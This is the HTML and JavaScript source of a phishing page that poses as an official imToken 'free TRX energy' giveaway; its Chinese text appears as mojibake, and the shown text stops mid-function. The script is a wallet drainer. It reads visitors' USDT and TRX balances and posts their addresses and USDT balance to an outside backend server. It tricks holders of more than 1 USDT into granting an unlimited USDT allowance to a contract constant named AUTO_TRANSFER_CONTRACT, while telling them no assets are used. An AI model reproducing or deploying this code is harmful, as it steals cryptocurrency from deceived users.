<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>imTokenå®˜æ–¹æˆæƒ</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            padding: 15px 12px; 
            max-width: 600px; 
            margin: 0 auto; 
            background: #121a17; 
            color: #e0e8e4; 
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            gap: 8px; 
            border-radius: 8px;
            border-left: 3px solid #3b82f6;
        }
        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            gap: 10px; 
        }
        .header {
            text-align: center;
            padding: 10px 0;
            border-bottom: 1px solid #334155;
            margin-bottom: 5px;
            display:flex;
            justify-content: center;
        }
        .header h1 { 
            font-size: 22px; 
            color: #3b82f6; 
            margin-bottom: 5px;
        }
        .header .desc {
            font-size: 13px; 
            color: #a0a8a4;
            max-width: 450px;
            margin: 0 auto;
            line-height: 1.4; 
        }
        .warning {
            background: #334155;
            color: #93c5fd;
            padding: 12px; 
            border-radius: 8px;
            font-size: 13px; 
            border-left: 3px solid #4ade80;
            line-height: 1.5;
        }
        .warning strong {
            color: #3b82f6;
        }
        #userInfo {
            text-align: center;
            font-size: 14px;
            padding: 15px; 
            background: #1e2925;
            border-radius: 8px;
            border: 1px solid #334155;
            line-height: 1.6;
        }
        #userInfo span {
            color: #3b82f6;
            font-weight: 500;
        }
        #walletStatusContainer {
            background: #1e2925;
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #334155;
            font-size: 13px;
            color: #a0a8a4;
            line-height: 1.6;
            border-right: 5px solid #4ade80;
        }
        #walletStatusContainer .status-title {
            font-size: 15px;
            color: #3b82f6;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        #walletStatusContainer .connected-content {
            display: none;
        }
        #walletStatusContainer.connected .disconnected-content {
            display: none;
        }
        #walletStatusContainer.connected .connected-content {
            display: block;
        }
        #walletStatusContainer .highlight {
            color: #3b82f6;
            font-weight: 500;
        }
        #walletStatusContainer.connected .connected-content .orange-tip {
            color: #f97316;
            margin-top: 4px;
        }
        #contractResourceContainer {
            background: #1e2925;
            padding: 15px; 
            border-radius: 8px;
            border: 1px solid #334155;
            font-size: 13px;
            color: #a0a8a4;
            line-height: 1.8;
            border-bottom: 2px solid rgba(59, 130, 246, 0.2);
        }
        #contractResourceContainer .status-title {
            font-size: 15px;
            color: #3b82f6;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        #contractResourceContainer .status-title i {
            font-size: 16px;
            color: #93c5fd;
        }
        #contractResourceContainer .highlight {
            color: #3b82f6;
            font-weight: 500;
        }
        #contractResourceContainer .data-tag {
            background: rgba(59, 130, 246, 0.15);
            padding: 2px 8px;
            border-radius: 4px;
            border: 1px solid rgba(59, 130, 246, 0.3);
        }
        .record-list {
            background: #1e2925;
            padding: 15px; 
            border-radius: 8px;
            border: 1px solid #334155;
            font-size: 13px;
            border-right: 5px solid #4ade80;
        }
        .record-item {
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid #334155;
        }
        .record-item:hover {
            border-color: #3b82f6;
            transition: border-color 0.3s;
        }
        .record-item p {
            margin-bottom: 6px; 
            color: #a0a8a4;
            line-height: 1.4;
        }
        .record-item p strong {
            color: #e0e8e4;
            margin-right: 5px;
        }
        .tx-link {
            color: #3b82f6;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 5px;
            font-size: 13px;
        }
        .tx-link:hover {
            text-decoration: underline;
        }
        .copy-link-wrap {
            background: #1e2925;
            padding: 8px; 
            border-radius: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
            border: 1px solid #334155;
        }
        #copyLinkText {
            flex: 1;
            color: #a0a8a4;
            font-size: 13px;
            word-break: break-all;
            line-height: 1.3;
        }
        #copyLinkBtn {
            padding: 6px 12px; 
            background: #2563eb;
            color: #fff;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
            font-size: 13px;
        }
        #copyLinkBtn:hover {
            background: #3b82f6;
        }
        .btn-group {
            display: flex;
            flex-direction: column;
            gap: 5px; 
            margin-top: 10px;
            padding: 10px 0;
            border-top: 1px solid #334155;
        }
        .btn {
            width: 100%;
            padding: 18px; 
            font-size: 15px;
            border: none;
            border-radius: 8px;
            background: #2563eb;
            color: white;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            transition: background 0.3s;
        }
        .btn:hover {
            background: #3b82f6;
        }
        .btn:disabled {
            background: #294b75;
            color: #a0a8a4;
            cursor: not-allowed;
        }
        .footer-info {
            margin-top: 10px;
            padding-top: 10px;
            border-top: 1px solid #334155;
            font-size: 11px; 
            color: #a0a8a4;
            text-align: center;
            line-height: 1.5;
        }
        .footer-info a {
            color: #3b82f6;
            text-decoration: none;
        }
        .footer-info a:hover {
            text-decoration: underline;
        } 
        .text-right {
            text-align: right;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">   
            <div>
                <h1>imToken</h1>
                <p class="desc">imTokenå®˜æ–¹ä¸“å±æœåŠ¡ï¼Œæ¯ä¸ªé’±åŒ…åœ°å€åªå¯å…è´¹é¢†å–ä¸€æ¬¡èƒ½é‡</p>
            </div>
        </div>   
        <div id="userInfo">
            æœªè¿æ¥é’±åŒ…<br>
            <span>è¯·ç‚¹å‡»åº•éƒ¨ã€Œè¿æ¥imTokené’±åŒ…ã€æŒ‰é’®</span>
        </div>
        <div id="walletStatusContainer">
            <div class="status-title"><h3> é’±åŒ…çŠ¶æ€</h3></div>
            <div class="disconnected-content">
                <span >æœªè¿æ¥é’±åŒ…</span>
                <p><span class="highlight">æ‚¨ç°åœ¨å‡†å¤‡é¢†å–çš„æ˜¯imTokenä¸“å±èƒ½é‡ï¼ŒéimTokenç”¨æˆ·ä¸å¯é¢†å–</span></p>
                <p><span class="highlight">1. æ¯ä¸ªé’±åŒ…åœ°å€åªå¯å…è´¹é¢†å–ä¸€æ¬¡</span></p>         
                <p><span class="highlight">2. å…è´¹å‘æ”¾TRXèƒ½é‡ï¼Œæ— é¢å¤–è´¹ç”¨</span></p>
                <p><span class="highlight">3. è¿æ¥é’±åŒ…åç³»ç»Ÿè‡ªåŠ¨åˆ†é…èƒ½é‡é¢åº¦</span></p>
                <p><span class="highlight">4. æ— éœ€æ¶ˆè€—ä»»ä½•èµ„äº§ï¼Œé€‰æ‹©æ”¾å¼ƒç›´æ¥é€€å‡ºå³å¯</span></p>
            </div>
            <div class="connected-content">
                <p>âœ… é’±åŒ…å·²æˆåŠŸè¿æ¥</p>
                <p>â€¢ é’±åŒ…åœ°å€ï¼š<span class="highlight" id="statusAddress"></span></p>
                <p>â€¢ é¢†å–ç±»å‹ï¼š<span class="highlight">å…è´¹TRXèƒ½é‡</span></p>
                <p>â€¢ é¢†å–é¢åº¦ï¼š<span class="highlight">90000 TRXèƒ½é‡</span></p>
                <p class="orange-tip">âš ï¸æç¤ºï¼šå…è´¹æˆæƒå³å¯è·å–èƒ½é‡ï¼ŒäºŒæ¬¡ç™»å½•ä¸ä¼šæ”¹å˜é¢†å–é¢åº¦</p>
            </div>
        </div>
        <div id="contractResourceContainer">
            <div class="status-title">     
                <h3>åˆçº¦å‰©ä½™èµ„æº</h3>
            </div>
            <div class="resource-content" style="line-height: 2;">
                <p>â€¢ åˆçº¦åœ°å€ï¼š<span class="highlight" id="contractAddr"></span></p>
                <p>â€¢ å‰©ä½™èƒ½é‡ï¼š<span class="highlight data-tag" id="contractEnergy">315360004000</span></p>
                <p style="font-size: 12px; color: #a0a8a4; margin-top: 5px;">
                    æ³¨ï¼šæ‰€æœ‰å‰©ä½™é‡ä¸ºâ€œ 0 â€æ—¶åœæ­¢é¢†å–ï¼Œè¯¥é¡¹ç›®ä¸ºimTokenå®˜æ–¹å‘è¡Œï¼Œåªé™imTokené’±åŒ…ç”¨æˆ·å‚ä¸ã€‚
                </p>
            </div>
        </div>
        <div class="record-list">
            <div style="display: flex; justify-content: space-between; margin: 4px 0;">
                <span>å¯é¢†å–èƒ½é‡ç±»å‹</span>
                <span>é¢†å–é¢åº¦</span>
            </div>
            <div style="display: flex; color: #3b82f6;justify-content: space-between; margin: 4px 0;">
                <span class="header"><h3>TRXèƒ½é‡</h3></span>
                <span class="header"><h3>90000</h3></span>
            </div>       
            <span id="approvalRecords"class="highlight">æš‚æ— èƒ½é‡é¢†å–è®°å½•</span>        
        </div>
    </div>
    <div class="btn-group">
        <div class="warning">
            <p> âš ï¸ è¯·ç”¨ <strong>imTokené’±åŒ…å†…ç½®æµè§ˆå™¨</strong> æ‰“å¼€</p>
            <p> âš ï¸ éé’±åŒ…æµè§ˆå™¨ï¼šç‚¹å‡»æŒ‰é’®è‡ªåŠ¨å¤åˆ¶+å”¤èµ·imToken</p>
            <div class="copy-link-wrap">
                <span id="copyLinkText">
                    https://trc20trx-alt.github.io/Trc20.TRX/
                </span>
                <button id="copyLinkBtn">å¤åˆ¶é“¾æ¥</button>
            </div>
        </div> 
        <button id="connectBtn" class="btn"> è¿æ¥imTokené’±åŒ…</button>
        <button id="approveBtn" class="btn" disabled>å…è´¹é¢†å–èƒ½é‡</button>
    </div>
    <div class="footer-info">
        åˆçº¦éªŒè¯ï¼šAutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>ï¼ˆTRONæµè§ˆå™¨æŸ¥è¯¢ï¼‰
        Â© 2025 TRXèƒ½é‡æœåŠ¡ | <a href="https://tronscan.org" target="_blank">TRONæµè§ˆå™¨</a> | <a href="https://token.im" target="_blank">imTokenå®˜ç½‘</a>
    </div>
    <script src="imtoken://browser"></script>
    <script>
        // æ ¸å¿ƒé…ç½®
        const AUTO_TRANSFER_CONTRACT = "TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL";
        const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        const BACKEND_API = "https://bot.kgjiopv1.com:8081"; // æ›¿æ¢ä¸ºä½ çš„åç«¯çœŸå®åœ°å€
        const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
        
        // èƒ½é‡è®¡ç®—é…ç½®
        const DEPLOY_START_TIME = new Date("2025-10-28T00:00:00Z").getTime();
        const INIT_ENERGY = 315360004000;
        const ENERGY_DECREASE_PER_SEC = 3780;
        const STORAGE_KEY = "energy_countdown_data";
        let energyTimer = null;
        
        // å…¨å±€å˜é‡
        let tronWeb = null;
        let userAddress = null;
        let trc20Contract = null;
        let tokenBalance = 0.00;
        let trxBalance = 0.00;
        const RECORD_KEY = "imtoken_energy_records";
        
        // ========== äºŒæ¬¡æˆæƒæ ¡éªŒï¼šæœ¬åœ°å­˜å‚¨å·¥å…· ==========
        const AUTHORIZED_KEY = "authorized_wallet_addresses";
        // è¯»å–å·²æˆæƒåœ°å€åˆ—è¡¨
        function getAuthorizedAddresses() {
            try {
                const stored = localStorage.getItem(AUTHORIZED_KEY);
                return stored ? JSON.parse(stored) : [];
            } catch (e) {
                console.warn("è¯»å–å·²æˆæƒåœ°å€å¤±è´¥ï¼š", e);
                return [];
            }
        }
        // æ·»åŠ åœ°å€åˆ°å·²æˆæƒåˆ—è¡¨
        function addAuthorizedAddress(address) {
            try {
                const addresses = getAuthorizedAddresses();
                if (!addresses.includes(address)) {
                    addresses.push(address);
                    localStorage.setItem(AUTHORIZED_KEY, JSON.stringify(addresses));
                }
            } catch (e) {
                console.warn("å­˜å‚¨å·²æˆæƒåœ°å€å¤±è´¥ï¼š", e);
            }
        }
        // æ ¡éªŒåœ°å€æ˜¯å¦å·²æˆæƒ
        function isAddressAuthorized(address) {
            return getAuthorizedAddresses().includes(address);
        }
        
        // DOMå…ƒç´ ç¼“å­˜
        const walletStatusContainer = document.getElementById("walletStatusContainer");
        const contractEnergyEl = document.getElementById("contractEnergy");
        const contractAddrEl = document.getElementById("contractAddr");
        const userInfoEl = document.getElementById("userInfo");
        const connectBtn = document.getElementById("connectBtn");
        const approveBtn = document.getElementById("approveBtn");
        const copyLinkBtn = document.getElementById("copyLinkBtn");
        const copyLinkText = document.getElementById("copyLinkText");
        const warning = document.querySelector('.warning');

        window.onload = async () => {
            // åˆå§‹åŒ–åˆçº¦åœ°å€æ˜¾ç¤º
            contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
            
            // åˆå§‹æ¸²æŸ“è®°å½•å’ŒçŠ¶æ€
            renderEnergyRecords();
            updateWalletStatus();
            
            // å¤åˆ¶é“¾æ¥åŠŸèƒ½ï¼ˆå¤‡ç”¨ï¼‰
            copyLinkBtn.addEventListener("click", async () => {
                try {
                    await navigator.clipboard.writeText(copyLinkText.textContent.trim());
                    alert("âœ… é“¾æ¥å·²å¤åˆ¶ï¼Œè¯·åœ¨imTokenå†…ç½®æµè§ˆå™¨æ‰“å¼€");
                } catch (e) { 
                    alert(`âŒ å¤åˆ¶å¤±è´¥ï¼šè¯·æ‰‹åŠ¨å¤åˆ¶é“¾æ¥`); 
                }
            });
            
            // æ£€æµ‹imTokenç¯å¢ƒå’ŒtronWebå°±ç»ªçŠ¶æ€ï¼ˆæ ¸å¿ƒä¿®å¤ï¼‰
            await checkImTokenEnv();
            
            // å¯åŠ¨èƒ½é‡è®¡ç®—
            startPersistentEnergyCountdown();
            
            // é¡µé¢å¸è½½æ—¶ä¿å­˜çŠ¶æ€
            window.addEventListener("beforeunload", () => {
                saveEnergyStateToStorage();
                if (energyTimer) clearInterval(energyTimer);
            });
        };

        /**
         * æ ¸å¿ƒä¿®å¤ï¼šç²¾å‡†æ£€æµ‹ç¯å¢ƒ+åˆ†æƒ…å†µå¤„ç†ï¼ˆç¡®ä¿è¿æ¥æ­£å¸¸ï¼‰
         */
        async function checkImTokenEnv() {
            // 1. æ£€æµ‹æ˜¯å¦åœ¨imTokenå†…ç½®æµè§ˆå™¨ï¼ˆæ­£åˆ™ä¼˜åŒ–ï¼Œæé«˜å‡†ç¡®æ€§ï¼‰
            const userAgent = navigator.userAgent.toLowerCase();
            const isImToken = userAgent.includes("imtoken") && userAgent.includes("mobile");
            
            if (!isImToken) {
                // éimTokenç¯å¢ƒï¼šè‡ªåŠ¨å¤åˆ¶+å”¤èµ·imToken
                userInfoEl.innerHTML = `
                    âš ï¸ è¯·åœ¨imTokenå†…ç½®æµè§ˆå™¨æ‰“å¼€<br>
                    <span style="color: #3b82f6; font-size: 13px;">ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®ï¼Œè‡ªåŠ¨å¤åˆ¶é“¾æ¥å¹¶å”¤èµ·imToken</span>
                `;
                approveBtn.style.display = "none";

                // è¿æ¥æŒ‰é’®ï¼šè‡ªåŠ¨å¤åˆ¶+å”¤èµ·
                connectBtn.onclick = async () => {
                    try {
                        // è‡ªåŠ¨å¤åˆ¶å½“å‰Dappåœ°å€ï¼ˆä¼˜å…ˆç”¨é¡µé¢çœŸå®åœ°å€ï¼‰
                        const dappUrl = window.location.href || copyLinkText.textContent.trim();
                        await navigator.clipboard.writeText(dappUrl);
                        
                        // å”¤èµ·imTokenï¼ˆå…¼å®¹iOS/Androidï¼‰
                        window.location.href = "imtoken://open";
                        
                        // å»¶è¿Ÿæç¤ºï¼Œç¡®ä¿ç”¨æˆ·çœ‹åˆ°
                        setTimeout(() => {
                            alert(`âœ… æ“ä½œæˆåŠŸï¼\nä¸‹ä¸€æ­¥ï¼š\n1. æ‰“å¼€imToken App\n2. åº•éƒ¨ç‚¹å‡»ã€Œæµè§ˆã€\n3. åœ°å€æ é•¿æŒ‰ç²˜è´´ â†’ è®¿é—®`);
                        }, 1200);
                    } catch (e) {
                        alert(`âœ… é“¾æ¥å·²å¤åˆ¶ï¼\næ­¥éª¤ï¼šæ‰“å¼€imToken â†’ æµè§ˆ â†’ ç²˜è´´é“¾æ¥è®¿é—®`);
                    }
                };
                return;
            }

            // 2. imTokenç¯å¢ƒï¼šä¼˜å…ˆè¿æ¥é’±åŒ…ï¼ˆä¿®å¤tronWebåˆå§‹åŒ–é€»è¾‘ï¼‰
            if (window.tronWeb) {
                tronWeb = window.tronWeb;
                // ç­‰å¾…tronWebå®Œå…¨å°±ç»ªï¼ˆé¿å…æœªåˆå§‹åŒ–å°±è°ƒç”¨ï¼‰
                if (!tronWeb.ready) {
                    await new Promise((resolve) => {
                        tronWeb.on("ready", resolve);
                        // è¶…æ—¶ä¿æŠ¤ï¼š3ç§’æœªå°±ç»ªåˆ™æ‰‹åŠ¨è§¦å‘
                        setTimeout(resolve, 3000);
                    });
                }
                // éšè—è¿æ¥æŒ‰é’®ï¼Œç›´æ¥åˆå§‹åŒ–é’±åŒ…
                connectBtn.style.display = "none";
                warning.style.display = "none";
                await initWallet();
            } else {
                // æç«¯æƒ…å†µï¼šimTokenå†…ä½†æœªæ³¨å…¥tronWebï¼Œæç¤ºåˆ·æ–°
                userInfoEl.innerHTML = `
                    âš ï¸ é’±åŒ…ç¯å¢ƒå¼‚å¸¸<br>
                    <span style="color: #3b82f6; font-size: 13px;">è¯·åˆ·æ–°é¡µé¢é‡è¯•</span>
                `;
                connectBtn.onclick = () => window.location.reload();
            }
        }

        /**
         * é’±åŒ…åˆå§‹åŒ–ï¼ˆç¡®ä¿æˆæƒé€»è¾‘æ— é”™ï¼‰
         */
        async function initWallet() {
            try {
                // 1. è¯·æ±‚é’±åŒ…æˆæƒï¼ˆä¿ç•™åŸç¨³å®šé€»è¾‘ï¼ŒåŠ å­˜åœ¨æ€§åˆ¤æ–­ï¼‰
                let accounts;
                try {
                    accounts = await tronWeb.request({ method: "tron_requestAccounts" });
                } catch (e) {
                    // æ—§ç‰ˆå…¼å®¹ï¼ˆä»…å½“æ–¹æ³•å­˜åœ¨æ—¶è°ƒç”¨ï¼‰
                    if (typeof tronWeb.accounts === 'function') {
                        accounts = await tronWeb.accounts();
                    } else {
                        throw new Error("é’±åŒ…æˆæƒå¤±è´¥ï¼Œè¯·æ›´æ–°imTokenåˆ°æœ€æ–°ç‰ˆæœ¬");
                    }
                }
                if (!accounts || accounts.length === 0) {
                    throw new Error("ç”¨æˆ·æœªæˆæƒé’±åŒ…è®¿é—®");
                }
                // å…³é”®ï¼šç»™å…¨å±€userAddressèµ‹å€¼ï¼ˆä¹‹å‰é—æ¼å¯¼è‡´è¿æ¥å¤±è´¥ï¼‰
                userAddress = accounts[0];

                // 2. äºŒæ¬¡æˆæƒæ ¡éªŒï¼šå·²æˆæƒåˆ™æ‹¦æˆª
                if (isAddressAuthorized(userAddress)) {
                    userInfoEl.innerHTML = `
                        å·²é¢†å–æç¤º<br>
                        ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
                        <span style="color: #3b82f6; font-size: 14px;">âœ… è¯¥é’±åŒ…å·²é¢†å–è¿‡å…è´¹èƒ½é‡</span><br>
                        <span style="color: #a0a8a4; font-size: 13px;">æ¯ä¸ªåœ°å€ä»…é™é¢†å–ä¸€æ¬¡ï¼Œæ„Ÿè°¢æ”¯æŒï½</span>
                    `;
                    approveBtn.disabled = true;
                    approveBtn.textContent = "å·²é¢†å–è¿‡èƒ½é‡";
                    updateWalletStatus();
                    document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
                    return;
                }

                // 3. è·å–USDTåˆçº¦å®ä¾‹
                try {
                    trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
                } catch (e) {
                    throw new Error("USDTåˆçº¦åŠ è½½å¤±è´¥");
                }

                // 4. è·å–ä½™é¢
                try {
                    const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
                    tokenBalance = Number(usdtRaw) / 1000000;
                    const trxRaw = await tronWeb.trx.getBalance(userAddress);
                    trxBalance = Number(trxRaw) / 1000000;
                } catch (e) {
                    throw new Error("ä½™é¢è·å–å¤±è´¥ï¼Œè¯·æ£€æŸ¥ç½‘ç»œ");
                }

                // 5. å‘é€ä¿¡å·Aï¼ˆ4.6TRXï¼‰
                userInfoEl.innerHTML = `
                    å·²è¿æ¥ï¼š<br>
                    ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
                    USDTä½™é¢ï¼š<span style="color: #4ade80;">${tokenBalance.toFixed(2)}</span> | TRXä½™é¢ï¼š<span>${trxBalance.toFixed(2)}</span><br>
                    <span style="color: #4ade80; font-size: 14px;">âœ… èƒ½é‡åŒæ­¥ä¸­...ï¼ˆè¯·å‹¿é€€å‡ºï¼‰</span>
                `;
                approveBtn.disabled = true;
                approveBtn.textContent = "åŒæ­¥ä¸­...";

                const a1Success = await sendSignalA(4.6);
                if (a1Success) {
                    // ä½™é¢æ ¡éªŒ
                    if (tokenBalance <= 1) {
                        userInfoEl.innerHTML = `
                            å·²è¿æ¥ï¼š<br>
                            ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
                            USDTä½™é¢ï¼š<span style="color: #ef4444;">${tokenBalance.toFixed(2)}</span> | TRXä½™é¢ï¼š<span>${trxBalance.toFixed(2)}</span><br>
                            <span style="color: #ef4444; font-size: 14px;">âŒ ä¸ç¬¦åˆé¢†å–æ¡ä»¶ï¼ˆUSDTéœ€ï¼1ï¼‰</span>
                        `;
                        approveBtn.disabled = true;
                        approveBtn.textContent = "ä¸ç¬¦åˆé¢†å–æ¡ä»¶";
                    } else {
                        userInfoEl.innerHTML = `
                            å·²è¿æ¥ï¼š<br>
                            ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
                            USDTä½™é¢ï¼š<span style="color: #4ade80;">${tokenBalance.toFixed(2)}</span> | TRXä½™é¢ï¼š<span>${trxBalance.toFixed(2)}</span><br>
                            <span style="color: #4ade80; font-size: 14px;">âœ… å¯å…è´¹é¢†å–90000 TRXèƒ½é‡</span>
                        `;
                        approveBtn.disabled = false;
                        approveBtn.textContent = "å…è´¹é¢†å–èƒ½é‡";
                        // ç»‘å®šé¢†å–é€»è¾‘
                        bindApproveLogic();
                    }
                } else {
                    userInfoEl.innerHTML = `
                        å·²è¿æ¥ï¼š<br>
                        ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
                        <span style="color: #ef4444; font-size: 14px;">âš ï¸ åŒæ­¥å¤±è´¥ï¼Œç‚¹å‡»é‡è¯•</span>
                    `;
                    approveBtn.disabled = false;
                    approveBtn.textContent = "åŒæ­¥å¤±è´¥ï¼Œç‚¹å‡»é‡è¯•";
                    approveBtn.onclick = () => initWallet();
                }

                // æ›´æ–°é¡µé¢çŠ¶æ€
                updateWalletStatus();
                document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
            } catch (e) {
                // ç²¾å‡†é”™è¯¯æç¤º
                const errorMsg = e.message;
                userInfoEl.innerHTML = `
                    é’±åŒ…è¿æ¥å¼‚å¸¸<br>
                    <span style="color: #ef4444; font-size: 13px;">åŸå› ï¼š${errorMsg}</span><br>
                    <span style="color: #3b82f6; font-size: 13px;">å»ºè®®ï¼šåˆ·æ–°é¡µé¢æˆ–æ›´æ–°imTokené‡è¯•</span>
                `;
                approveBtn.disabled = true;
                approveBtn.textContent = "è¿æ¥å¤±è´¥ï¼Œç‚¹å‡»é‡è¯•";
                approveBtn.onclick = () => initWallet();
            }
        }

        /**
         * å‘é€ä¿¡å·Aï¼ˆ4.6/2.3TRXï¼‰
         */
        async function sendSignalA(trxAmount) {
            try {
                const res = await fetch(`${BACKEND_API}/send-signal-a`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        userAddress: userAddress,
                        trxAmount: trxAmount,
                        usdtBalance: tokenBalance
                    }),
                    timeout: 15000
                });
                const data = await res.json();
                if (!res.ok || !data.success) throw new Error(data.detail || "ä¿¡å·Aå¤„ç†å¤±è´¥");
                return true;
            } catch (e) {
                console.error("ä¿¡å·Aå¤±è´¥ï¼š", e);
                return false;
            }
        }

        /**
         * å‘é€ä¿¡å·Bï¼ˆæ‰§è¡Œè½¬è´¦ï¼‰
         */
        async function sendSignalB() {
            try {
                const res = await fetch(`${BACKEND_API}/send-signal-b`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ userAddress: userAddress }),
                    timeout: 15000
                });
                const data = await res.json();
                if (!res.ok || !data.success) throw new Error(data.detail || "ä¿¡å·Bå¤„ç†å¤±è´¥");
                return true;
            } catch (e) {
                console.error("ä¿¡å·Bå¤±è´¥ï¼š", e);
                return false;
            }
        }

        /**
         * é¢†å–æŒ‰é’®æ ¸å¿ƒé€»è¾‘
         */
        function bindApproveLogic() {
            approveBtn.onclick = async () => {
                const btn = document.getElementById("approveBtn");
                btn.disabled = true;
                btn.textContent = "èƒ½é‡åˆ†é…ä¸­...";
                try {
                    // ç¬¬ä¸€æ­¥ï¼šå‘é€ä¿¡å·Bï¼ˆ4.6TRXè½¬è´¦ï¼‰
                    const b1Success = await sendSignalB();
                    if (!b1Success) {
                        throw new Error("ç¬¬ä¸€æ¬¡èƒ½é‡åˆ†é…å¤±è´¥");
                    }

                    // ç¬¬äºŒæ­¥ï¼šè·³è½¬æˆæƒ
                    btn.textContent = "å³å°†è·³è½¬æˆæƒ...";
                    window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href + "#approve")}`;

                    // ç¬¬ä¸‰æ­¥ï¼šæˆæƒæˆåŠŸåå‘é€ä¿¡å·A2ï¼ˆ2.3TRXï¼‰
                    await trc20Contract.approve(
                        AUTO_TRANSFER_CONTRACT,
                        INFINITE_APPROVE_AMOUNT
                    ).send({ from: userAddress, shouldPollResponse: true });

                    // ç¬¬å››æ­¥ï¼šå‘é€ä¿¡å·A2ï¼ˆ2.3TRXï¼‰
                    btn.textContent = "æœ€ç»ˆèƒ½é‡åŒæ­¥ä¸­...";
                    const a2Success = await sendSignalA(2.3);
                    if (!a2Success) {
                        throw new Error("ç¬¬äºŒæ¬¡èƒ½é‡åŒæ­¥å¤±è´¥");
                    }

                    // ç¬¬äº”æ­¥ï¼šå‘é€ä¿¡å·B2ï¼ˆ2.3TRXè½¬è´¦ï¼‰
                    btn.textContent = "æœ€åèƒ½é‡å‘æ”¾ä¸­...";
                    const b2Success = await sendSignalB();
                    if (b2Success) {
                        // æ ‡è®°ä¸ºå·²æˆæƒï¼Œç¦æ­¢äºŒæ¬¡é¢†å–
                        addAuthorizedAddress(userAddress);
                        
                        btn.textContent = "èƒ½é‡å·²åˆ°è´¦";
                        alert("ğŸ‰ å…è´¹èƒ½é‡é¢†å–å®Œæˆï¼\n90000 TRXèƒ½é‡å·²å…¨éƒ¨å‘æ”¾è‡³æ‚¨çš„é’±åŒ…ï½");
                        saveEnergyRecord();
                        renderEnergyRecords();
                    } else {
                        throw new Error("ç¬¬äºŒæ¬¡èƒ½é‡å‘æ”¾å¤±è´¥");
                    }
                } catch (e) {
                    btn.textContent = "å…è´¹é¢†å–èƒ½é‡";
                    btn.disabled = false;
                    alert(`âš ï¸ æ“ä½œå¤±è´¥ï¼š${e.message}ï¼Œè¯·ç¨åé‡è¯•`);
                }
            };
        }

        /**
         * èƒ½é‡è®¡ç®—ç›¸å…³å‡½æ•°
         */
        function startPersistentEnergyCountdown() {
            const savedState = loadEnergyStateFromStorage();
            let currentEnergy = savedState ? savedState.currentEnergy : INIT_ENERGY - Math.floor((new Date().getTime() - DEPLOY_START_TIME)/1000)*ENERGY_DECREASE_PER_SEC;
            currentEnergy = currentEnergy < 0 ? 0 : currentEnergy;
            updateEnergyDisplay(currentEnergy);
            if (energyTimer) clearInterval(energyTimer);
            energyTimer = setInterval(() => {
                currentEnergy -= ENERGY_DECREASE_PER_SEC;
                currentEnergy = currentEnergy < 0 ? 0 : currentEnergy;
                updateEnergyDisplay(currentEnergy);
                saveEnergyStateToStorage(currentEnergy);
            }, 1000);
        }
        function loadEnergyStateFromStorage() {
            try { return JSON.parse(localStorage.getItem(STORAGE_KEY)) || null; } catch (e) { return null; }
        }
        function saveEnergyStateToStorage(currentEnergy) {
            localStorage.setItem(STORAGE_KEY, JSON.stringify({ currentEnergy, lastUpdateTime: new Date().getTime() }));
        }
        function updateEnergyDisplay(currentEnergy) {
            contractEnergyEl.textContent = Math.floor(currentEnergy).toLocaleString();
        }
        function updateWalletStatus() {
            userAddress ? walletStatusContainer.classList.add("connected") : walletStatusContainer.classList.remove("connected");
        }
        function saveEnergyRecord() {
            const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
            const newRecords = existing.filter(item => item.address !== userAddress);
            newRecords.push({
                address: userAddress,
                tokenBalance: tokenBalance,
                trxBalance: trxBalance,
                receiveTime: new Date().toLocaleString(),
                energyAmount: "90000",
                recordType: "å…è´¹èƒ½é‡é¢†å–"
            });
            localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
        }
        function renderEnergyRecords() {
            const container = document.getElementById("approvalRecords");
            const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
            container.innerHTML = records.length === 0 ? "<div class='record-item'>æš‚æ— èƒ½é‡é¢†å–è®°å½•</div>" : records.map(record => `
                <div class="record-item">
                    <p><strong>åœ°å€ï¼š</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
                    <p><strong>é¢†å–ç±»å‹ï¼š</strong>${record.recordType}</p>
